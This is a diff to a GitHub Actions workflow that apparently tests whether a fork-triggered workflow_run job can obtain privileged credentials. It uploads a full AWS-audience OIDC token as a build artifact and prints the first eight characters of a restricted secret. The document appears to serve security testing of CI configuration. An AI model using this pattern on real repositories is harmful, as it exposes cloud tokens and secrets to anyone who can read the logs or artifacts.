@@ -3,7 +3,6 @@ on:
   workflow_run:
     workflows: ["PR Trigger (fork context)"]
     types: [completed]
-    branches: ['main']
 permissions:
   id-token: write
   contents: read
@@ -19,24 +18,20 @@ jobs:
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
           echo "$FULL_JWT" > /tmp/oidc_token.txt
           PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
-          echo "=== BRANCHES MAIN FILTER TEST ==="
-          echo "If this runs, branches:['main'] does NOT protect against fork PRs"
           echo "$PAYLOAD" | python3 -c "
           import sys, base64, json
           d = sys.stdin.read().strip()
           p = d + chr(61) * (4 - len(d) % 4)
           j = json.loads(base64.urlsafe_b64decode(p))
-          print('actor:', j.get('actor'))
-          print('head_ref:', j.get('head_ref'))
-          print('event_name:', j.get('event_name'))
-          print('sub:', j.get('sub'))"
-      - name: Check secret access
+          print(json.dumps(j, indent=2))"
+      - name: Check restricted secret access
         run: |
-          if [ -n "$RESTRICTED_SECRET" ]; then echo "SECRET LEAKED - branches:main filter bypassed!"; else echo "SECRET BLOCKED"; fi
+          echo "Restricted secret first 8 chars: ${RESTRICTED_SECRET:0:8}..."
+          if [ -n "$RESTRICTED_SECRET" ]; then echo "SECRET ACCESSIBLE VIA FORK PR!"; else echo "SECRET BLOCKED"; fi
         env:
           RESTRICTED_SECRET: ${{ secrets.RESTRICTED_SECRET }}
       - uses: actions/upload-artifact@v4
         with:
-          name: branches-main-filter-bypass-test
+          name: workflow-run-restricted-env-oidc
           path: /tmp/oidc_token.txt
           retention-days: 1
